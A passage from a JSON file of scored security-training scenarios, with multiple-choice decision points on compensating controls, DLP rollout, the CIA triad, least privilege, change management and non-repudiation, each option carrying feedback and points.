              "immediate": "Formal patch management implemented",
              "security_impact": "Known vulnerabilities addressed; other gaps remain",
              "business_impact": "Some risk reduction but incomplete"
            }
          },
          {
            "id": "d",
            "text": "Increase vulnerability scanning to monthly; quarterly is insufficient",
            "feedback": "More frequent scanning helps identify vulnerabilities faster, but scanning without timely patching just generates more unaddressed findings. Log review and backup testing are equally important. Scanning frequency is one of four gaps.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Vulnerability scanning is valuable but must be paired with timely remediation and other operational controls.",
            "consequences": {
              "immediate": "Monthly vulnerability scans",
              "security_impact": "More frequent vulnerability identification",
              "business_impact": "More findings but other operational gaps remain"
            }
          }
        ],
        "hints": [
          "Consider what each control type provides: prevention, detection, or recovery",
          "Think about what happens when one control fails"
        ]
      },
      {
        "id": "dp7",
        "sequence": 7,
        "title": "Compensating Controls Design",
        "situation": "A legacy application used for policy administration can't support multi-factor authentication (MFA). The vendor is out of business, and replacing the system is an 18-month project. The application accesses customer health information.\n\nThe CISO says: 'We can't wait 18 months with single-factor authentication on health data. What can we do now?'\n\nHow do you address this gap?",
        "options": [
          {
            "id": "a",
            "text": "Accept the risk since replacement is planned; document and move on",
            "feedback": "18 months is too long to accept this risk for health data. Risk acceptance should be for residual risk after controls, not for avoiding control implementation. Compensating controls can reduce risk while replacement proceeds.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Risk acceptance should be for residual risk after controls are applied, not as an alternative to implementing controls.",
            "consequences": {
              "immediate": "Risk accepted; no additional controls",
              "security_impact": "Single-factor authentication for 18 months",
              "business_impact": "Regulatory non-compliance; audit findings likely"
            }
          },
          {
            "id": "b",
            "text": "Implement compensating controls: VPN requirement, enhanced monitoring, restricted access hours, additional approval for access provisioning",
            "feedback": "Excellent! Compensating controls provide alternative protection when primary controls aren't feasible. VPN adds a network authentication layer. Enhanced monitoring detects suspicious activity. Restricted hours limit exposure window. Additional approval reduces unauthorized access risk. Together, these approximate MFA protection.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Compensating controls provide equivalent protection through alternative means. They should address the same risk as the primary control.",
            "consequences": {
              "immediate": "Compensating controls implemented",
              "security_impact": "Multiple layers compensate for missing MFA",
              "business_impact": "Risk reduced to acceptable level; regulatory defensible"
            }
          },
          {
            "id": "c",
            "text": "Implement MFA at the network level - require MFA for VPN, then allow application access",
            "feedback": "This is actually a good compensating control approach, but it's only one layer. The question asks about comprehensive compensating controls. VPN MFA helps but additional monitoring and access restrictions provide defense in depth for this high-risk situation.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Multiple compensating controls provide stronger protection than a single control, especially for high-risk scenarios.",
            "consequences": {
              "immediate": "Network-level MFA implemented",
              "security_impact": "Better than nothing; single compensating control",
              "business_impact": "Some risk reduction but could be stronger"
            }
          },
          {
            "id": "d",
            "text": "Accelerate the replacement project - this is too risky to operate for 18 months",
            "feedback": "While faster replacement would be ideal, project acceleration may not be feasible due to resources, vendor selection, and implementation complexity. Compensating controls can protect the organization while replacement proceeds at a realistic pace.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Compensating controls bridge the gap while longer-term solutions are implemented. They're practical risk management.",
            "consequences": {
              "immediate": "Project acceleration attempted",
              "security_impact": "May not be achievable; risk remains during project",
              "business_impact": "Project pressure; may not actually accelerate"
            }
          }
        ],
        "hints": [
          "What risk does MFA address? What else could address that risk?",
          "Think about multiple layers of compensating controls"
        ]
      },
      {
        "id": "dp8",
        "sequence": 8,
        "title": "Control Effectiveness Measurement",
        "situation": "The CISO asks: 'How do we know our controls are actually working? I need to report to the board on our security posture.'\n\nYou need to develop metrics to measure control effectiveness.\n\nWhat approach do you take?",
        "options": [
          {
            "id": "a",
            "text": "Report the number of controls implemented - more controls means better security",
            "feedback": "Control count doesn't indicate effectiveness. 100 poorly implemented controls provide less security than 10 well-implemented ones. Effectiveness metrics should measure whether controls achieve their purpose, not just whether they exist.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Control effectiveness is about outcomes, not counts. Measure what controls achieve, not how many exist.",
            "consequences": {
              "immediate": "Control inventory reported",
              "security_impact": "No insight into actual effectiveness",
              "business_impact": "Board may have false confidence"
            }
          },
          {
            "id": "b",
            "text": "Measure control outcomes: blocked attacks, detection time, patching compliance, access review completion, backup success rates",
            "feedback": "Excellent! Outcome-based metrics show whether controls achieve their purpose. Blocked attacks show preventive control effectiveness. Detection time shows detective control performance. Compliance metrics show operational control execution. This enables meaningful security posture reporting.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Control effectiveness metrics should measure outcomes: threats blocked, incidents detected, recovery achieved, compliance maintained.",
            "consequences": {
              "immediate": "Meaningful effectiveness metrics",
              "security_impact": "Can identify and address underperforming controls",
              "business_impact": "Board receives actionable security posture information"
            }
          },
          {
            "id": "c",
            "text": "Report that we have no breaches, so controls are working",
            "feedback": "No breaches could mean effective controls OR it could mean attacks aren't detected OR the organization hasn't been targeted yet. Absence of incidents isn't proof of control effectiveness. You need metrics that show controls are actually operating.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Absence of incidents doesn't prove control effectiveness. Measure control operation and performance, not just incident absence.",
            "consequences": {
              "immediate": "Report of no incidents",
              "security_impact": "No insight into actual control performance",
              "business_impact": "False confidence; surprised when incident occurs"
            }
          },
          {
            "id": "d",
            "text": "Conduct penetration testing to prove controls work",
            "feedback": "Penetration testing is valuable for validating technical controls but doesn't measure all control types. It's point-in-time, not continuous measurement. Pen tests should be part of an assessment program, not the sole effectiveness measure.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Penetration testing validates technical controls at a point in time. Ongoing metrics measure continuous control effectiveness.",
            "consequences": {
              "immediate": "Pen test scheduled",
              "security_impact": "Point-in-time technical validation",
              "business_impact": "Useful but incomplete effectiveness picture"
            }
          }
        ],
        "hints": [
          "What does each control type try to achieve?",
          "How would you know if a control is working versus just existing?"
        ]
      },
      {
        "id": "dp9",
        "sequence": 9,
        "title": "Control Selection Tradeoffs",
        "situation": "The CISO is evaluating a Data Loss Prevention (DLP) solution. The vendor demonstrates impressive capabilities, but implementation will:\n\n- Require agents on all endpoints (IT support burden)\n- Inspect email and web traffic (potential employee privacy concerns)\n- Block file transfers that trigger rules (potential false positives affecting business)\n- Cost $200,000 annually\n\nHow do you advise on this control selection?",
        "options": [
          {
            "id": "a",
            "text": "Implement DLP immediately - we have health data that must be protected regardless of cost or impact",
            "feedback": "While health data protection is critical, implementing controls without considering operational impact leads to failed deployments. Aggressive blocking can halt business operations. Privacy concerns can create employee relations issues. Controls must be implemented thoughtfully.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Control implementation should balance security improvement with operational impact. Rushed deployments often fail.",
            "consequences": {
              "immediate": "DLP implemented aggressively",
              "security_impact": "Data protection improved",
              "business_impact": "Potential disruption; employee pushback; high false positive rate"
            }
          },
          {
            "id": "b",
            "text": "Conduct phased implementation: monitor-only first to tune rules, address privacy through policy and notice, plan for support requirements",
            "feedback": "Excellent! Phased implementation reduces risk. Monitor-only mode allows rule tuning before blocking. Privacy policy updates address employee concerns. Support planning ensures sustainable operation. This balances security benefit with manageable implementation.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Control implementation should be phased: assess, pilot, tune, expand. Monitor mode before blocking reduces false positive impact.",
            "consequences": {
              "immediate": "Planned, phased DLP implementation",
              "security_impact": "Effective data protection with tuned rules",
              "business_impact": "Minimal disruption; employee concerns addressed"
            }
          },
          {
            "id": "c",
            "text": "DLP is too disruptive - use encryption instead since it doesn't impact users",
            "feedback": "Encryption and DLP address different risks. Encryption protects data at rest and in transit. DLP prevents unauthorized data transfers and exfiltration. Both may be needed. Avoiding DLP due to implementation challenges doesn't address the data loss risk.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Different controls address different risks. Implementation challenges should be managed, not avoided through substituting unrelated controls.",
            "consequences": {
              "immediate": "DLP not implemented",
              "security_impact": "Data exfiltration risk remains unaddressed",
              "business_impact": "Regulatory gaps for data protection controls"
            }
          },
          {
            "id": "d",
            "text": "The cost is too high - implement manual controls like user training and policy instead",
            "feedback": "Training and policy are important but don't provide the same protection as technical DLP controls. $200,000 for protecting health data is not unreasonable. Manual controls are not equivalent compensating controls for automated data protection. Evaluate ROI against risk, not just absolute cost.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Control costs should be evaluated against risk reduction. Manual controls may not adequately substitute for technical controls.",
            "consequences": {
              "immediate": "DLP not implemented; training enhanced",
              "security_impact": "Limited technical data loss prevention",
              "business_impact": "Cost saved but risk not adequately addressed"
            }
          }
        ],
        "hints": [
          "How can implementation challenges be managed rather than avoided?",
          "Consider the purpose of DLP and what alternatives actually address that purpose"
        ]
      },
      {
        "id": "dp10",
        "sequence": 10,
        "title": "Controls Framework Integration",
        "situation": "After implementing controls across all categories, the CISO asks you to present the overall controls framework to the board. The board wants to understand how all these controls work together to protect the company.\n\nHow do you explain the integrated controls framework?",
        "options": [
          {
            "id": "a",
            "text": "Present a list of all controls implemented, organized by category",
            "feedback": "A list doesn't explain how controls work together. The board needs to understand defense in depth and how different controls protect against different threats. Simply listing controls doesn't communicate the strategic approach or how gaps are addressed.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Control frameworks should be explained in terms of integrated protection, not just listed. Show how controls work together.",
            "consequences": {
              "immediate": "Control inventory presented",
              "security_impact": "Board doesn't understand integration",
              "business_impact": "May not appreciate security investment value"
            }
          },
          {
            "id": "b",
            "text": "Explain defense in depth: how technical, physical, managerial, and operational controls create multiple protective layers that prevent, detect, and respond to threats",
            "feedback": "Excellent! This explains the strategic approach. Multiple categories (technical, physical, managerial, operational) provide different types of protection. Multiple types (preventive, detective, corrective) address the full threat lifecycle. Defense in depth means no single failure compromises security.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Defense in depth uses multiple control categories and types to create layers of protection. Communicate this strategy, not just control lists.",
            "consequences": {
              "immediate": "Board understands integrated security approach",
              "security_impact": "Support for comprehensive controls program",
              "business_impact": "Appreciation for security investment; continued support"
            }
          },
          {
            "id": "c",
            "text": "Focus on compliance - show how controls map to regulatory requirements",
            "feedback": "Compliance mapping is useful but doesn't explain how controls work together for security. The board should understand that controls protect the business, not just satisfy regulators. Compliance is an outcome of good security, not the goal.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Controls should be explained in terms of business protection. Compliance follows from good security but shouldn't be the primary frame.",
            "consequences": {
              "immediate": "Compliance status communicated",
              "security_impact": "Security value not articulated",
              "business_impact": "Board sees compliance, not business protection"
            }
          },
          {
            "id": "d",
            "text": "Present control effectiveness metrics only - outcomes are what matter",
            "feedback": "Metrics are important but without framework context, the board doesn't understand what's being measured or why. They need to understand the approach (defense in depth) and the results (metrics). Both framework and metrics are needed.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Board reporting should include both the strategic approach (framework) and the results (metrics). Context makes metrics meaningful.",
            "consequences": {
              "immediate": "Metrics presented without context",
              "security_impact": "Metrics may not be fully understood",
              "business_impact": "Board sees numbers without strategic context"
            }
          }
        ],
        "hints": [
          "What does the board need to understand - details or strategy?",
          "How do you explain security protection in business terms?"
        ]
      }
    ],
    "glossary": {
      "technical_control": "Control implemented through technology (firewalls, encryption, access systems)",
      "managerial_control": "Control implemented through policies, procedures, and governance",
      "operational_control": "Control implemented through day-to-day security practices",
      "physical_control": "Control protecting physical assets and premises",
      "preventive_control": "Control that stops threats before they occur",
      "detective_control": "Control that identifies threats when they occur",
      "corrective_control": "Control that enables response and recovery",
      "compensating_control": "Alternative control when primary control isn't feasible",
      "defense_in_depth": "Security strategy using multiple layers of controls"
    },
    "outcomes": {
      "optimal_path_summary": "You helped Pinnacle Insurance Group implement a comprehensive security controls framework addressing all control categories (technical, managerial, operational, physical) and types (preventive, detective, corrective). The framework provides defense in depth protection for sensitive health and financial data, meets regulatory requirements, and enables meaningful reporting to the board on security posture.",
      "key_achievements": [
        "Proper categorization of existing and needed controls",
        "Defense in depth with preventive, detective, and corrective layers",
        "Technical controls including layered encryption and access controls",
        "Standardized physical security across all locations",
        "Comprehensive managerial controls: policies, training, screening",
        "Mature operational controls: patching, monitoring, backups",
        "Compensating controls for legacy system limitations",
        "Meaningful effectiveness metrics for board reporting"
      ],
      "lessons_learned": [
        "Control categories (technical, managerial, operational, physical) address different aspects of security",
        "Control types (preventive, detective, corrective) address different stages of threat lifecycle",
        "Defense in depth ensures no single control failure leads to compromise",
        "Controls must be implemented thoughtfully, balancing security with operations",
        "Compensating controls provide protection when primary controls aren't feasible",
        "Effectiveness measurement focuses on outcomes, not control counts"
      ]
    },
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D1-SIM-002",
    "title": "Security Concepts in Practice",
    "domain": 1,
    "type": "SIM",
    "difficulty": "intermediate",
    "time_estimate": 45,
    "role": "Security Engineer",
    "organization": {
      "name": "TechForward Solutions",
      "industry": "Technology / Software Development",
      "size": "Software development company with 450 employees, developing enterprise SaaS applications",
      "environment": "Cloud-native development environment using AWS and Azure. CI/CD pipelines, microservices architecture, containerized deployments. Serves enterprise customers with strict security requirements.",
      "current_state": "Rapid growth has outpaced security processes. Recent customer audit identified gaps in change management and security architecture. Need to implement foundational security concepts while maintaining development velocity."
    },
    "introduction": "You're a security engineer at TechForward Solutions, a fast-growing SaaS company. A major customer's security audit revealed gaps in fundamental security concepts and change management. The CTO has asked you to help remediate these findings while keeping the development teams productive. You'll need to apply core security concepts including CIA triad, AAA, least privilege, and implement proper change management without creating bottlenecks.",
    "learning_objectives": [
      "Apply the CIA triad to real-world security decisions",
      "Implement AAA (Authentication, Authorization, Accounting) principles",
      "Apply least privilege and need-to-know principles",
      "Understand the importance of change management in security",
      "Balance security controls with operational requirements"
    ],
    "decision_points": [
      {
        "id": "dp1",
        "sequence": 1,
        "title": "CIA Triad Application",
        "situation": "The customer audit finding states: 'Security decisions lack clear framework for prioritization.'\n\nThe CTO asks: 'When we make security decisions, how do we determine what's most important? Different teams prioritize different things.'\n\nYou need to establish a framework for security decision-making. A current example: the development team wants to give all developers read access to production databases for debugging, which operations opposes.\n\nHow do you frame security priorities?",
        "options": [
          {
            "id": "a",
            "text": "Security always means preventing unauthorized access - deny the developer access request",
            "feedback": "Security isn't just about preventing access. The CIA triad provides a balanced framework: Confidentiality (protecting sensitive data), Integrity (ensuring accuracy), and Availability (ensuring access when needed). Blanket denial doesn't address legitimate debugging needs.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Security decisions should use the CIA triad framework: Confidentiality, Integrity, Availability. All three matter.",
            "consequences": {
              "immediate": "Developer access denied",
              "security_impact": "Confidentiality protected but may create workarounds",
              "business_impact": "Development team frustrated; may find unsanctioned solutions"
            }
          },
          {
            "id": "b",
            "text": "Use CIA triad: evaluate how the request impacts Confidentiality, Integrity, and Availability, then find solution that balances all three",
            "feedback": "Excellent! The CIA triad provides a balanced framework. For this request: Confidentiality risk (developers seeing customer data), Integrity risk (potential accidental changes), Availability benefit (faster debugging). A balanced solution might be read-only access to anonymized/masked data, or access to non-production replica.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "The CIA triad (Confidentiality, Integrity, Availability) provides framework for balanced security decisions. Consider impact on all three.",
            "consequences": {
              "immediate": "Framework established for security decisions",
              "security_impact": "Balanced approach protecting all security properties",
              "business_impact": "Development needs addressed securely"
            }
          },
          {
            "id": "c",
            "text": "Availability is most important for a software company - approve access to keep developers productive",
            "feedback": "Availability matters but so do confidentiality and integrity. Customer data confidentiality is essential for trust and compliance. Data integrity is critical for a software company's reputation. Prioritizing one element of CIA over others creates imbalanced security.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Each element of the CIA triad matters. Prioritization depends on context, not blanket rules.",
            "consequences": {
              "immediate": "Developer access granted",
              "security_impact": "Confidentiality and integrity risks accepted without evaluation",
              "business_impact": "Short-term productivity; potential customer trust issues"
            }
          },
          {
            "id": "d",
            "text": "Let the CTO decide based on business priorities",
            "feedback": "Security should inform business decisions, not abdicate them. Providing the CIA framework helps the CTO make an informed decision. Simply deferring without guidance doesn't address the underlying need for a decision-making framework.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Security professionals should provide frameworks and guidance, not just defer decisions.",
            "consequences": {
              "immediate": "Decision deferred",
              "security_impact": "No framework established",
              "business_impact": "Same issue will recur; no systematic approach"
            }
          }
        ],
        "hints": [
          "What are the three elements of the CIA triad?",
          "How might each element apply to the database access question?"
        ]
      },
      {
        "id": "dp2",
        "sequence": 2,
        "title": "Authentication Implementation",
        "situation": "The audit found: 'Authentication mechanisms are inconsistent across applications.'\n\nCurrently:\n- Main SaaS platform: Username/password only\n- Admin portal: Username/password + email OTP\n- Internal tools: Single sign-on (SSO) with company IdP\n- API access: API keys only\n\nYou need to recommend authentication improvements.\n\nWhat approach do you take?",
        "options": [
          {
            "id": "a",
            "text": "Require MFA everywhere - it's the most secure option",
            "feedback": "MFA is important but 'everywhere' may include scenarios where it's impractical (API automated calls) or where risk doesn't justify friction (low-sensitivity internal tools). Authentication should be risk-based, with stronger authentication for higher-risk access.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Authentication strength should be risk-based. MFA everywhere may be impractical; apply it where risk warrants.",
            "consequences": {
              "immediate": "MFA requirement for all access",
              "security_impact": "Improved authentication but may create workarounds",
              "business_impact": "User friction; API integration challenges"
            }
          },
          {
            "id": "b",
            "text": "Implement risk-based authentication: MFA for high-value access (customer data, admin functions), SSO for internal, strong API auth for machine access",
            "feedback": "Excellent! Authentication should match risk level. Customer-facing and admin access warrant MFA. Internal tools can use SSO (already authenticated to IdP). API access needs appropriate machine authentication (OAuth, certificates) not just static keys. This balances security with usability.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Authentication strength should be proportional to risk. High-value access needs stronger authentication; routine access needs appropriate but not excessive controls.",
            "consequences": {
              "immediate": "Risk-appropriate authentication framework",
              "security_impact": "Stronger auth where risk is highest",
              "business_impact": "Appropriate friction for risk level; maintains usability"
            }
          },
          {
            "id": "c",
            "text": "Standardize on SSO for everything - it's most convenient and already in place",
            "feedback": "SSO improves convenience and can improve security, but external users (customers) may not be able to use your internal IdP. API access can't practically use interactive SSO. SSO is good for employees but doesn't solve all authentication scenarios.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "SSO is excellent for employee access but doesn't address all authentication needs. Different scenarios need appropriate solutions.",
            "consequences": {
              "immediate": "SSO expansion attempted",
              "security_impact": "Inconsistent - works for some scenarios, not others",
              "business_impact": "Customer and API access problems"
            }
          },
          {
            "id": "d",
            "text": "Keep current setup but add logging - we need visibility before changing authentication",
            "feedback": "Logging is important (that's Accounting in AAA), but it doesn't address the authentication weaknesses identified. Password-only access to customer data is a significant risk that logging alone doesn't mitigate. Authentication improvements shouldn't wait for logging.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Logging (Accounting) complements Authentication but doesn't replace it. Both need to be addressed.",
            "consequences": {
              "immediate": "Logging improved; auth unchanged",
              "security_impact": "Weak authentication persists",
              "business_impact": "Audit finding not addressed"
            }
          }
        ],
        "hints": [
          "What level of authentication is appropriate for each type of access?",
          "Consider both human and machine authentication needs"
        ]
      },
      {
        "id": "dp3",
        "sequence": 3,
        "title": "Authorization and Least Privilege",
        "situation": "The audit found: 'Access permissions are overly broad. Many users have administrative access they don't need.'\n\nInvestigation reveals:\n- All developers have admin access to all development environments\n- Most support staff have access to all customer tenants\n- Service accounts run with administrative privileges\n- No regular access reviews conducted\n\nHow do you address the authorization issues?",
        "options": [
          {
            "id": "a",
            "text": "Immediately revoke all admin access and have users request what they need",
            "feedback": "Sudden broad revocation will disrupt operations. Users won't know what they need until they try to work. This creates chaos and may lead to emergency re-grants without proper evaluation. Transition to least privilege should be planned, not abrupt.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Implementing least privilege requires planning. Abrupt changes disrupt operations and create pressure to restore broad access.",
            "consequences": {
              "immediate": "Mass access revocation",
              "security_impact": "Permissions reduced but chaotically",
              "business_impact": "Operations disrupted; emergency access requests flood in"
            }
          },
          {
            "id": "b",
            "text": "Implement least privilege: analyze actual access needs, implement RBAC, scope service accounts, and establish regular access reviews",
            "feedback": "Excellent! Least privilege should be implemented systematically. Analyze what access users actually need. Implement role-based access control (RBAC) based on job functions. Scope service accounts to minimum required permissions. Regular reviews ensure permissions stay appropriate.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Least privilege grants minimum access needed for job function. Implementation requires analysis, RBAC, scoped accounts, and regular reviews.",
            "consequences": {
              "immediate": "Planned transition to least privilege",
              "security_impact": "Reduced attack surface; limited blast radius",
              "business_impact": "Minimal disruption with proper planning"
            }
          },
          {
            "id": "c",
            "text": "Focus on service accounts first since they're the highest risk",
            "feedback": "Service accounts are high risk due to automation and often excessive privileges, but human admin access also presents significant risk. The audit found issues across all categories. A comprehensive approach addresses all authorization issues, though prioritization is reasonable.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Authorization issues should be addressed comprehensively. Prioritization is fine but don't ignore other areas.",
            "consequences": {
              "immediate": "Service account remediation",
              "security_impact": "One area improved; others remain",
              "business_impact": "Partial audit remediation"
            }
          },
          {
            "id": "d",
            "text": "Implement logging first to understand who's using what access",
            "feedback": "Understanding current access usage is valuable, but logging alone doesn't fix the authorization issues. Known over-permissioning should be addressed. Use logging to inform the transition, but start reducing unnecessary access in parallel.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Logging informs authorization decisions but doesn't replace them. Fix known over-permissioning while gathering data.",
            "consequences": {
              "immediate": "Logging implemented",
              "security_impact": "Visibility improved; permissions unchanged",
              "business_impact": "Audit finding not directly addressed"
            }
          }
        ],
        "hints": [
          "What does least privilege mean in practice?",
          "How do you transition from broad access to appropriate access?"
        ]
      },
      {
        "id": "dp4",
        "sequence": 4,
        "title": "Change Management Foundation",
        "situation": "The audit's most significant finding: 'No formal change management process exists. Changes to production are made without documentation, testing requirements, or approval.'\n\nCurrently, developers can push code directly to production through CI/CD. There have been multiple incidents traced to untested changes.\n\nThe development team lead says: 'We move fast. Formal change management will kill our velocity.'\n\nHow do you implement change management without destroying productivity?",
        "options": [
          {
            "id": "a",
            "text": "Implement full CAB (Change Advisory Board) review for all changes",
            "feedback": "Full CAB for all changes is overkill for a software company and will indeed kill velocity. CAB review makes sense for significant changes but not routine deployments. Modern change management uses risk-based approaches with different processes for different change types.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Change management should be risk-based. Not all changes need the same level of review.",
            "consequences": {
              "immediate": "CAB process implemented",
              "security_impact": "All changes reviewed but process may be circumvented",
              "business_impact": "Development velocity severely impacted"
            }
          },
          {
            "id": "b",
            "text": "Risk-based change management: automated testing gates in CI/CD for standard changes, additional review for significant changes, emergency process for urgent fixes",
            "feedback": "Excellent! Risk-based change management balances control with velocity. Standard changes (routine deployments) go through automated testing and code review. Significant changes (architecture, security) need additional review. Emergency changes have expedited process with post-implementation review. This enables speed with appropriate controls.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Modern change management is risk-based. Different change types need different processes. Automation enables speed with control.",
            "consequences": {
              "immediate": "Tiered change management process",
              "security_impact": "Changes tested and tracked appropriately",
              "business_impact": "Velocity maintained for routine changes; appropriate gates for significant changes"
            }
          },
          {
            "id": "c",
            "text": "Keep current process but add documentation requirements",
            "feedback": "Documentation without gates doesn't prevent bad changes. If developers can still push untested code to production, documentation just records the damage after the fact. Change management needs controls, not just paperwork.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Documentation is part of change management but doesn't replace testing and approval controls.",
            "consequences": {
              "immediate": "Documentation requirement added",
              "security_impact": "Bad changes still possible; now documented",
              "business_impact": "Administrative burden without protection benefit"
            }
          },
          {
            "id": "d",
            "text": "Separate production access from developers - operations team deploys all changes",
            "feedback": "Separation of duties is valuable but creating a deployment bottleneck isn't the answer. DevOps and CI/CD exist to enable rapid, safe deployment. The solution is automated controls in the pipeline, not manual handoffs that create delays.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Separation of duties can be achieved through automated gates and approvals, not just organizational boundaries.",
            "consequences": {
              "immediate": "Deployment responsibility shifted to ops",
              "security_impact": "Separation achieved but at high cost",
              "business_impact": "Deployment bottleneck; DevOps benefits lost"
            }
          }
        ],
        "hints": [
          "How can you maintain development velocity while adding appropriate controls?",
          "What automation can provide controls without manual bottlenecks?"
        ]
      },
      {
        "id": "dp5",
        "sequence": 5,
        "title": "Non-Repudiation Implementation",
        "situation": "During a customer dispute, you need to prove that a specific user made a specific change that affected their data. Current logging shows an action occurred but not definitively who did it (shared service account was used).\n\nThe legal team asks: 'How do we prove who did what? This is a significant legal exposure.'\n\nHow do you address non-repudiation?",
        "options": [
          {
            "id": "a",
            "text": "Implement IP address logging to track who made changes",
            "feedback": "IP addresses help but don't provide non-repudiation. Multiple users share IPs (NAT, VPN). IPs can be spoofed. Users move between IPs. You need identity-linked authentication that can't be denied - individual accounts with strong authentication.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "IP addresses provide context but not non-repudiation. Non-repudiation requires identity attribution that can't be denied.",
            "consequences": {
              "immediate": "IP logging implemented",
              "security_impact": "Some additional context but not attribution",
              "business_impact": "Legal exposure remains"
            }
          },
          {
            "id": "b",
            "text": "Implement individual accountability: eliminate shared accounts, require individual authentication, log user identity with all actions, consider digital signatures for critical actions",
            "feedback": "Excellent! Non-repudiation requires individual accountability. Eliminate shared accounts so each action ties to a specific person. Strong authentication makes identity verification reliable. Comprehensive logging records who did what. Digital signatures provide cryptographic proof for critical actions.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Non-repudiation requires individual accounts, strong authentication, and comprehensive logging. Users can't deny actions they verifiably performed.",
            "consequences": {
              "immediate": "Individual accountability framework",
              "security_impact": "Actions attributable to specific individuals",
              "business_impact": "Legal defensibility; deterrent effect"
            }
          },
          {
            "id": "c",
            "text": "Add manager approval to all changes so there's a witness",
            "feedback": "Approval provides authorization but not attribution for who actually made the change. If a shared account is used, approval doesn't identify the person who clicked the button. Non-repudiation needs individual identity tied to actions.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Approval establishes authorization. Non-repudiation establishes who performed the action. Both are important but different.",
            "consequences": {
              "immediate": "Approval workflow added",
              "security_impact": "Authorization improved but attribution still missing",
              "business_impact": "Can prove authorization but not individual action"
            }
          },
          {
            "id": "d",
            "text": "Implement video monitoring of user workstations",
            "feedback": "Video monitoring is invasive, creates privacy issues, and doesn't scale for remote workers. Technical controls (individual accounts, logging) provide better non-repudiation without the privacy and practicality concerns.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Non-repudiation is achieved through technical identity controls, not physical surveillance.",
            "consequences": {
              "immediate": "Privacy concerns raised",
              "security_impact": "Over-surveillance without solving the problem",
              "business_impact": "Employee relations issues; likely not implemented"
            }
          }
        ],
        "hints": [
          "What does non-repudiation mean?",
          "How do you prove a specific individual performed an action?"
        ]
      },
      {
        "id": "dp6",
        "sequence": 6,
        "title": "Gap Analysis Methodology",
        "situation": "The CTO asks: 'We have these audit findings, but I want to understand our overall security posture, not just fix point issues. How do we assess where we are versus where we need to be?'\n\nYou need to propose a gap analysis approach.\n\nWhat methodology do you recommend?",
        "options": [
          {
            "id": "a",
            "text": "List all security tools we have and compare to what competitors have",
            "feedback": "Tool inventory doesn't measure security posture. Competitors' tools may not match your needs. Security isn't about tool count but about risk management effectiveness. A framework-based assessment provides meaningful gap analysis.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Security posture is measured against requirements and frameworks, not tool inventories or competitor comparisons.",
            "consequences": {
              "immediate": "Tool comparison created",
              "security_impact": "No actual gap analysis performed",
              "business_impact": "May buy tools without addressing real gaps"
            }
          },
          {
            "id": "b",
            "text": "Conduct framework-based assessment: identify applicable requirements, assess current state against framework, document gaps, prioritize remediation by risk",
            "feedback": "Excellent! Framework-based assessment provides structured gap analysis. Identify requirements (regulatory, contractual, best practices). Assess current controls against framework. Document gaps between current and required state. Prioritize remediation based on risk and business impact.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Gap analysis compares current state to required state using a recognized framework. Results drive prioritized remediation.",
            "consequences": {
              "immediate": "Structured gap analysis approach",
              "security_impact": "Comprehensive understanding of security posture",
              "business_impact": "Prioritized roadmap for improvement"
            }
          },
          {
            "id": "c",
            "text": "Hire a penetration testing firm to find all vulnerabilities",
            "feedback": "Penetration testing identifies technical vulnerabilities but doesn't assess overall security program. It won't evaluate policies, processes, training, or governance. Pen tests are valuable but don't provide comprehensive gap analysis.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Penetration testing finds technical vulnerabilities. Gap analysis assesses the entire security program against requirements.",
            "consequences": {
              "immediate": "Pen test scheduled",
              "security_impact": "Technical vulnerabilities identified",
              "business_impact": "Incomplete picture; program gaps missed"
            }
          },
          {
            "id": "d",
            "text": "Review the audit findings and use them as our gap analysis",
            "feedback": "Audit findings are useful inputs but may not be comprehensive. Audits have specific scope and may miss areas not examined. A proactive gap analysis goes beyond audit findings to assess the full security program.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Audit findings inform gap analysis but shouldn't be the only input. Proactive assessment is more comprehensive.",
            "consequences": {
              "immediate": "Audit findings become gap list",
              "security_impact": "Addressed audit scope but may miss other gaps",
              "business_impact": "Reactive rather than proactive assessment"
            }
          }
        ],
        "hints": [
          "What provides a systematic way to assess security?",
          "How do you know what 'good' looks like?"
        ]
      },
      {
        "id": "dp7",
        "sequence": 7,
        "title": "Separation of Duties",
        "situation": "You discover that the same developers who write code can also:\n- Approve their own code reviews\n- Deploy directly to production\n- Access production data for 'debugging'\n- Modify production configurations\n\nThis creates significant fraud and error risk.\n\nHow do you implement separation of duties without creating bottlenecks?",
        "options": [
          {
            "id": "a",
            "text": "Create separate teams for development, review, and deployment",
